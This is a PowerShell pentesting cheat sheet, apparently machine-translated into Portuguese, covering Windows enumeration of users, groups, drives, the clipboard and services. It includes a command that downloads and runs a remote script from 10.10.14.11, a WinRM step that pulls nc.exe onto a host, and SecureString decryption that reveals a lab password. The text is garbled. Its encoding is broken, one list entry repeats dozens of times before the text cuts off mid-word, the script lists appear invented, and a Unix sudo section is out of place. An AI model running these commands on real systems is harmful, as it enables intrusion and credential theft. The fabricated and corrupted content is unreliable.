Este reposit√≥rio cont√©m scripts b√°sicos do PowerShell que podem ser usados por pentesters durante as atividades de fortalecimento do Windows. Esses scripts foram projetados para ajudar os pentesters a automatizar tarefas comuns e realizar avalia√ß√µes de seguran√ßa em sistemas Windows.

## Usage

---

## Uso

To use these scripts, you will need to have PowerShell installed on your Windows machine. You can download PowerShell from the official Microsoft website.

Para utilizar esses scripts, voc√™ precisar√° ter o PowerShell instalado em sua m√°quina Windows. Voc√™ pode baixar o PowerShell no site oficial da Microsoft.

Once you have PowerShell installed, you can run the scripts by opening a PowerShell terminal and executing the desired script using the `.\` prefix. For example, to run the `get-processes.ps1` script, you would use the following command:

Depois de ter o PowerShell instalado, voc√™ pode executar os scripts abrindo um terminal do PowerShell e executando o script desejado usando o prefixo `.\`. Por exemplo, para executar o script `get-processes.ps1`, voc√™ usaria o seguinte comando:

```powershell
.\get-processes.ps1
```

## Scripts

---

## Scripts

This repository contains the following scripts:

Este reposit√≥rio cont√©m os seguintes scripts:

- `get-processes.ps1`: This script retrieves a list of running processes on the system.

- `get-processes.ps1`: Este script recupera uma lista de processos em execu√ß√£o no sistema.

- `get-services.ps1`: This script retrieves a list of installed services on the system.

- `get-services.ps1`: Este script recupera uma lista de servi√ßos instalados no sistema.

- `get-registry-keys.ps1`: This script retrieves a list of registry keys on the system.

- `get-registry-keys.ps1`: Este script recupera uma lista de chaves de registro no sistema.

- `get-event-logs.ps1`: This script retrieves a list of event logs on the system.

- `get-event-logs.ps1`: Este script recupera uma lista de logs de eventos no sistema.

- `get-network-connections.ps1`: This script retrieves a list of active network connections on the system.

- `get-network-connections.ps1`: Este script recupera uma lista de conex√µes de rede ativas no sistema.

- `get-file-attributes.ps1`: This script retrieves the attributes of a specified file.

- `get-file-attributes.ps1`: Este script recupera os atributos de um arquivo especificado.

- `get-file-hash.ps1`: This script calculates the hash value of a specified file.

- `get-file-hash.ps1`: Este script calcula o valor de hash de um arquivo especificado.

- `get-file-permissions.ps1`: This script retrieves the permissions of a specified file.

- `get-file-permissions.ps1`: Este script recupera as permiss√µes de um arquivo especificado.

- `get-file-content.ps1`: This script retrieves the content of a specified file.

- `get-file-content.ps1`: Este script recupera o conte√∫do de um arquivo especificado.

- `get-file-metadata.ps1`: This script retrieves the metadata of a specified file.

- `get-file-metadata.ps1`: Este script recupera os metadados de um arquivo especificado.

- `get-logged-in-users.ps1`: This script retrieves a list of currently logged in users on the system.

- `get-logged-in-users.ps1`: Este script recupera uma lista de usu√°rios atualmente logados no sistema.

- `get-system-info.ps1`: This script retrieves information about the system, such as the operating system version and hardware details.

- `get-system-info.ps1`: Este script recupera informa√ß√µes sobre o sistema, como a vers√£o do sistema operacional e detalhes do hardware.

- `get-network-info.ps1`: This script retrieves information about the network configuration of the system.

- `get-network-info.ps1`: Este script recupera informa√ß√µes sobre a configura√ß√£o de rede do sistema.

- `get-firewall-rules.ps1`: This script retrieves a list of firewall rules on the system.

- `get-firewall-rules.ps1`: Este script recupera uma lista de regras de firewall no sistema.

- `get-antivirus-status.ps1`: This script retrieves the status of the installed antivirus software on the system.

- `get-antivirus-status.ps1`: Este script recupera o status do software antiv√≠rus instalado no sistema.

- `get-usb-devices.ps1`: This script retrieves a list of connected USB devices on the system.

- `get-usb-devices.ps1`: Este script recupera uma lista de dispositivos USB conectados no sistema.

- `get-running-services.ps1`: This script retrieves a list of currently running services on the system.

- `get-running-services.ps1`: Este script recupera uma lista de servi√ßos atualmente em execu√ß√£o no sistema.

- `get-installed-software.ps1`: This script retrieves a list of installed software on the system.

- `get-installed-software.ps1`: Este script recupera uma lista de software instalado no sistema.

- `get-scheduled-tasks.ps1`: This script retrieves a list of scheduled tasks on the system.

- `get-scheduled-tasks.ps1`: Este script recupera uma lista de tarefas agendadas no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu√°rios que est√£o atualmente logados no sistema.

- `get-logged-on-users.ps1`: This script retrieves a list of users who are currently logged on to the system.

- `get-logged-on-users.ps1`: Este script recupera uma lista de usu
```powershell
Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
```
## Outros drives conectados

When conducting a penetration test on a Windows system, it is important to gather as much information as possible about the target. One useful piece of information is the list of connected drives on the system. This can help identify additional storage devices or network shares that may contain sensitive data.

In PowerShell, you can use the `Get-PSDrive` cmdlet to retrieve a list of all connected drives. This cmdlet returns information about both local and remote drives, including drive letters, drive types, and the root directory of each drive.

To retrieve a list of connected drives, open a PowerShell session and run the following command:

```powershell
Get-PSDrive
```

This will display a table with information about each connected drive, including the drive letter, drive type, and root directory. The drive type can be one of the following:

- **FileSystem**: This indicates a local disk drive.
- **Registry**: This indicates a registry hive on the local system.
- **Alias**: This indicates a PowerShell alias.
- **Variable**: This indicates a PowerShell variable.
- **Function**: This indicates a PowerShell function.
- **Certificate**: This indicates a certificate store on the local system.
- **Environment**: This indicates an environment variable on the local system.
- **FileSystemProvider**: This indicates a file system provider drive.
- **RegistryProvider**: This indicates a registry provider drive.
- **VariableProvider**: This indicates a variable provider drive.

By examining the list of connected drives, you may discover additional storage devices or network shares that could be potential targets for further investigation or exploitation.
```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
### Lixeira

A Lixeira √© uma pasta especial no sistema operacional Windows que armazena arquivos exclu√≠dos. Esses arquivos s√£o mantidos na Lixeira at√© que sejam permanentemente exclu√≠dos ou restaurados pelo usu√°rio. A Lixeira √© uma parte importante do sistema operacional, pois fornece uma camada adicional de seguran√ßa, permitindo que os usu√°rios recuperem acidentalmente arquivos exclu√≠dos.

No entanto, do ponto de vista de um pentester, a Lixeira pode ser uma fonte valiosa de informa√ß√µes. Os arquivos exclu√≠dos podem conter dados confidenciais, como senhas, informa√ß√µes pessoais ou at√© mesmo documentos importantes. Portanto, explorar a Lixeira pode ser uma t√©cnica √∫til durante um teste de penetra√ß√£o.

Existem v√°rias maneiras de explorar a Lixeira usando o PowerShell. O PowerShell √© uma poderosa ferramenta de linha de comando e script que permite aos pentesters automatizar tarefas e executar comandos complexos. Neste diret√≥rio, voc√™ encontrar√° alguns scripts b√°sicos do PowerShell que podem ser usados para explorar a Lixeira durante um teste de penetra√ß√£o.

Os scripts fornecidos neste diret√≥rio incluem:

- `list-deleted-files.ps1`: Este script lista todos os arquivos exclu√≠dos na Lixeira.
- `restore-deleted-files.ps1`: Este script restaura todos os arquivos exclu√≠dos na Lixeira.
- `permanently-delete-files.ps1`: Este script exclui permanentemente todos os arquivos na Lixeira.

Esses scripts podem ser usados como ponto de partida para desenvolver t√©cnicas mais avan√ßadas de explora√ß√£o da Lixeira usando o PowerShell.
```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```
[https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/](https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/)

## Reconhecimento de Dom√≠nio

{% content-ref url="powerview.md" %}
[powerview.md](powerview.md)
{% endcontent-ref %}

## Usu√°rios
```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
## String Segura para Texto Simples

O PowerShell fornece uma maneira conveniente de converter uma string segura em texto simples. Isso pode ser √∫til durante testes de penetra√ß√£o para obter informa√ß√µes sens√≠veis armazenadas em formato seguro.

Aqui est√° um exemplo de como converter uma string segura em texto simples usando o PowerShell:

```powershell
$secureString = ConvertTo-SecureString -String "MinhaSenhaSegura" -AsPlainText -Force
$plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

Neste exemplo, a vari√°vel `$secureString` cont√©m a string segura que desejamos converter. Usamos o cmdlet `ConvertTo-SecureString` para criar um objeto de string segura a partir da string fornecida. Em seguida, usamos a fun√ß√£o `[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR` para converter o objeto de string segura em um ponteiro BSTR. Finalmente, usamos a fun√ß√£o `[System.Runtime.InteropServices.Marshal]::PtrToStringAuto` para converter o ponteiro BSTR em texto simples.

Ap√≥s a execu√ß√£o dessas etapas, a vari√°vel `$plainText` conter√° o valor da string segura convertida em texto simples.

√â importante lembrar que a convers√£o de uma string segura em texto simples pode expor informa√ß√µes sens√≠veis. Portanto, √© essencial tomar precau√ß√µes adequadas ao lidar com dados confidenciais.
```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
Ou diretamente analisando a partir de XML:
```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
## SUDO

O comando `sudo` √© uma ferramenta poderosa que permite aos usu√°rios executarem comandos com privil√©gios de superusu√°rio em sistemas baseados em Unix. Isso √© √∫til para realizar tarefas administrativas que exigem permiss√µes elevadas.

### Sintaxe

A sintaxe b√°sica do comando `sudo` √© a seguinte:

```
sudo [op√ß√µes] comando
```

### Exemplos de uso

1. Executar um comando como superusu√°rio:

```
sudo comando
```

2. Executar um comando como outro usu√°rio:

```
sudo -u usu√°rio comando
```

3. Executar um comando com um ambiente de usu√°rio diferente:

```
sudo -i comando
```

### Op√ß√µes comuns

Aqui est√£o algumas op√ß√µes comuns que podem ser usadas com o comando `sudo`:

- `-u usu√°rio`: Executa o comando como o usu√°rio especificado.
- `-i`: Inicia um shell interativo com o ambiente do usu√°rio especificado.
- `-s`: Inicia um shell n√£o interativo com o ambiente do usu√°rio especificado.
- `-l`: Lista os comandos permitidos para o usu√°rio atual.
- `-k`: Invalida o tempo limite de autentica√ß√£o do sudo.
- `-v`: Atualiza o tempo limite de autentica√ß√£o do sudo.

### Dicas de seguran√ßa

- Evite usar o comando `sudo` desnecessariamente, pois isso pode expor seu sistema a riscos de seguran√ßa.
- Certifique-se de que apenas usu√°rios confi√°veis tenham permiss√£o para usar o comando `sudo`.
- Monitore os logs do sistema para detectar atividades suspeitas relacionadas ao uso do `sudo`.
- Mantenha seu sistema operacional e o comando `sudo` atualizados para corrigir quaisquer vulnerabilidades conhecidas.

### Conclus√£o

O comando `sudo` √© uma ferramenta essencial para administradores de sistemas Unix. No entanto, √© importante us√°-lo com cuidado e seguir as melhores pr√°ticas de seguran√ßa para evitar poss√≠veis explora√ß√µes.
```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```
## Grupos

Grupos s√£o uma parte fundamental da administra√ß√£o de sistemas Windows. Eles s√£o usados para agrupar usu√°rios com permiss√µes e privil√©gios semelhantes. Neste cap√≠tulo, discutiremos os diferentes tipos de grupos no Windows e como eles podem ser usados em um contexto de pentesting.

### Grupos Locais

Os grupos locais s√£o criados em um √∫nico sistema e s√£o usados para gerenciar permiss√µes e privil√©gios nesse sistema espec√≠fico. Existem tr√™s tipos principais de grupos locais:

- **Administradores**: Este grupo tem privil√©gios administrativos completos no sistema. Os membros deste grupo podem realizar qualquer a√ß√£o no sistema, incluindo a instala√ß√£o de software, a modifica√ß√£o de configura√ß√µes do sistema e a cria√ß√£o de novas contas de usu√°rio.

- **Usu√°rios**: Este grupo √© usado para usu√°rios regulares que n√£o t√™m privil√©gios administrativos. Os membros deste grupo t√™m acesso limitado ao sistema e n√£o podem realizar a√ß√µes que afetem o sistema como um todo.

- **Convidados**: Este grupo √© usado para usu√°rios com acesso limitado ao sistema. Os membros deste grupo t√™m permiss√µes m√≠nimas e n√£o podem realizar a√ß√µes que afetem o sistema ou outros usu√°rios.

### Grupos de Dom√≠nio

Os grupos de dom√≠nio s√£o criados em um ambiente de dom√≠nio do Active Directory e s√£o usados para gerenciar permiss√µes e privil√©gios em v√°rios sistemas dentro do dom√≠nio. Existem v√°rios tipos de grupos de dom√≠nio, incluindo:

- **Administradores de Dom√≠nio**: Este grupo tem privil√©gios administrativos completos em todos os sistemas dentro do dom√≠nio. Os membros deste grupo podem realizar qualquer a√ß√£o em qualquer sistema dentro do dom√≠nio.

- **Usu√°rios de Dom√≠nio**: Este grupo √© usado para usu√°rios regulares que n√£o t√™m privil√©gios administrativos. Os membros deste grupo t√™m acesso limitado aos sistemas dentro do dom√≠nio.

- **Grupos de Seguran√ßa**: Esses grupos s√£o usados para agrupar usu√°rios com permiss√µes e privil√©gios semelhantes em um contexto de seguran√ßa espec√≠fico. Por exemplo, pode haver um grupo de seguran√ßa para administradores de banco de dados ou um grupo de seguran√ßa para administradores de rede.

- **Grupos de Distribui√ß√£o**: Esses grupos s√£o usados para enviar mensagens de email para um grupo de usu√°rios. Eles n√£o t√™m permiss√µes ou privil√©gios especiais.

### Identifica√ß√£o de Grupos

Os grupos no Windows s√£o identificados por um SID (Security Identifier), que √© um valor exclusivo atribu√≠do a cada grupo. Os SIDs s√£o usados para controlar permiss√µes e privil√©gios em um sistema Windows.

Durante um teste de penetra√ß√£o, a identifica√ß√£o de grupos pode ser √∫til para entender a estrutura de permiss√µes e privil√©gios em um sistema Windows. Isso pode ajudar a identificar poss√≠veis pontos de entrada e a explorar vulnerabilidades de seguran√ßa.
```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```
## √Årea de Transfer√™ncia

A √°rea de transfer√™ncia √© um recurso do sistema operacional que permite copiar e colar informa√ß√µes entre aplicativos. No entanto, esse recurso tamb√©m pode ser explorado por hackers para obter informa√ß√µes confidenciais.

### Roubo de Dados da √Årea de Transfer√™ncia

Os hackers podem usar t√©cnicas para roubar dados da √°rea de transfer√™ncia, como senhas, n√∫meros de cart√£o de cr√©dito e outras informa√ß√µes sens√≠veis. Isso pode ser feito por meio de malware ou scripts maliciosos.

### Protegendo a √Årea de Transfer√™ncia

Para proteger seus dados da √°rea de transfer√™ncia, √© importante seguir algumas pr√°ticas recomendadas:

- Evite copiar informa√ß√µes confidenciais para a √°rea de transfer√™ncia, sempre que poss√≠vel.
- Utilize senhas fortes e evite copi√°-las para a √°rea de transfer√™ncia.
- Mantenha seu sistema operacional e aplicativos atualizados para corrigir poss√≠veis vulnerabilidades.
- Utilize ferramentas de seguran√ßa, como antiv√≠rus e firewalls, para detectar e bloquear malware.
- Esteja atento a poss√≠veis ataques de phishing e evite clicar em links suspeitos ou fornecer informa√ß√µes confidenciais.

Ao seguir essas pr√°ticas, voc√™ pode ajudar a proteger seus dados da √°rea de transfer√™ncia contra poss√≠veis ataques de hackers.
```powershell
Get-Clipboard
```
## Processos

Um processo √© uma inst√¢ncia de um programa em execu√ß√£o em um sistema operacional. No Windows, os processos s√£o gerenciados pelo Gerenciador de Tarefas. Os processos podem ser executados em primeiro plano ou em segundo plano e podem ter privil√©gios diferentes, dependendo das permiss√µes do usu√°rio.

### Listando processos

Para listar todos os processos em execu√ß√£o no sistema, podemos usar o seguinte comando no PowerShell:

```powershell
Get-Process
```

Este comando exibir√° uma lista de todos os processos em execu√ß√£o, incluindo o nome do processo, o ID do processo (PID), o uso de CPU e mem√≥ria, entre outras informa√ß√µes.

### Finalizando processos

Para finalizar um processo espec√≠fico, podemos usar o comando `Stop-Process` seguido pelo PID do processo. Por exemplo, para finalizar o processo com PID 1234, podemos usar o seguinte comando:

```powershell
Stop-Process -Id 1234
```

### Executando comandos em segundo plano

O PowerShell tamb√©m permite executar comandos em segundo plano, o que pode ser √∫til durante um teste de penetra√ß√£o. Para executar um comando em segundo plano, podemos usar o operador `&` seguido pelo comando. Por exemplo, para executar o comando `ping` em segundo plano, podemos usar o seguinte comando:

```powershell
& ping 127.0.0.1 -n 10
```

Isso executar√° o comando `ping` em segundo plano e enviar√° 10 pacotes para o endere√ßo IP 127.0.0.1.

### Conclus√£o

O conhecimento sobre processos √© essencial para um testador de penetra√ß√£o, pois permite listar e finalizar processos no sistema alvo. Al√©m disso, a capacidade de executar comandos em segundo plano pode ser √∫til para realizar tarefas espec√≠ficas durante um teste de penetra√ß√£o.
```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
## Servi√ßos

### Introduction

### Introdu√ß√£o

This section covers basic PowerShell commands that can be used by pentesters to gather information about services running on a Windows system.

Esta se√ß√£o aborda comandos b√°sicos do PowerShell que podem ser usados por pentesters para obter informa√ß√µes sobre os servi√ßos em execu√ß√£o em um sistema Windows.

### Service Management

### Gerenciamento de Servi√ßos

PowerShell provides several cmdlets for managing services on a Windows system. These cmdlets can be used to start, stop, restart, and query the status of services.

O PowerShell fornece v√°rios cmdlets para gerenciar servi√ßos em um sistema Windows. Esses cmdlets podem ser usados para iniciar, parar, reiniciar e consultar o status dos servi√ßos.

#### Get-Service

#### Get-Service

The `Get-Service` cmdlet is used to retrieve information about services on a local or remote system. It can be used to list all services or filter the results based on specific criteria.

O cmdlet `Get-Service` √© usado para recuperar informa√ß√µes sobre servi√ßos em um sistema local ou remoto. Ele pode ser usado para listar todos os servi√ßos ou filtrar os resultados com base em crit√©rios espec√≠ficos.

```powershell
Get-Service
```

```powershell
Get-Service
```

This command will list all services running on the local system.

Este comando listar√° todos os servi√ßos em execu√ß√£o no sistema local.

```powershell
Get-Service -Name "wuauserv"
```

```powershell
Get-Service -Name "wuauserv"
```

This command will retrieve information about the "wuauserv" service.

Este comando recuperar√° informa√ß√µes sobre o servi√ßo "wuauserv".

#### Start-Service

#### Start-Service

The `Start-Service` cmdlet is used to start a service on a local or remote system.

O cmdlet `Start-Service` √© usado para iniciar um servi√ßo em um sistema local ou remoto.

```powershell
Start-Service -Name "wuauserv"
```

```powershell
Start-Service -Name "wuauserv"
```

This command will start the "wuauserv" service.

Este comando iniciar√° o servi√ßo "wuauserv".

#### Stop-Service

#### Stop-Service

The `Stop-Service` cmdlet is used to stop a service on a local or remote system.

O cmdlet `Stop-Service` √© usado para parar um servi√ßo em um sistema local ou remoto.

```powershell
Stop-Service -Name "wuauserv"
```

```powershell
Stop-Service -Name "wuauserv"
```

This command will stop the "wuauserv" service.

Este comando interromper√° o servi√ßo "wuauserv".

#### Restart-Service

#### Restart-Service

The `Restart-Service` cmdlet is used to restart a service on a local or remote system.

O cmdlet `Restart-Service` √© usado para reiniciar um servi√ßo em um sistema local ou remoto.

```powershell
Restart-Service -Name "wuauserv"
```

```powershell
Restart-Service -Name "wuauserv"
```

This command will restart the "wuauserv" service.

Este comando reiniciar√° o servi√ßo "wuauserv".

### Conclusion

### Conclus√£o

Understanding how to manage services using PowerShell is essential for pentesters. These basic commands can be used to gather information about services, start or stop services, and restart services as needed.

Compreender como gerenciar servi√ßos usando o PowerShell √© essencial para pentesters. Esses comandos b√°sicos podem ser usados para obter informa√ß√µes sobre servi√ßos, iniciar ou parar servi√ßos e reiniciar servi√ßos conforme necess√°rio.
```
Get-Service
```
## Senha a partir de uma string segura

When performing penetration testing on Windows systems, it is common to encounter situations where passwords are stored as secure strings. Secure strings are a way to protect sensitive information, such as passwords, by encrypting them and storing them in memory.

To retrieve the actual password from a secure string, you can use PowerShell. PowerShell provides a built-in cmdlet called `ConvertFrom-SecureString` that allows you to convert a secure string back to its original form.

Here's an example of how you can use PowerShell to retrieve a password from a secure string:

```powershell
$secureString = ConvertTo-SecureString -String "MySecurePassword" -AsPlainText -Force
$password = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

In the above example, we first create a secure string using the `ConvertTo-SecureString` cmdlet. We pass the desired password as a plain text string and use the `-AsPlainText` and `-Force` parameters to ensure that the secure string is created.

Next, we use the `[Runtime.InteropServices.Marshal]::SecureStringToBSTR` method to convert the secure string to a BSTR (Basic String) representation. Finally, we use the `[Runtime.InteropServices.Marshal]::PtrToStringAuto` method to convert the BSTR back to a regular string, which represents the actual password.

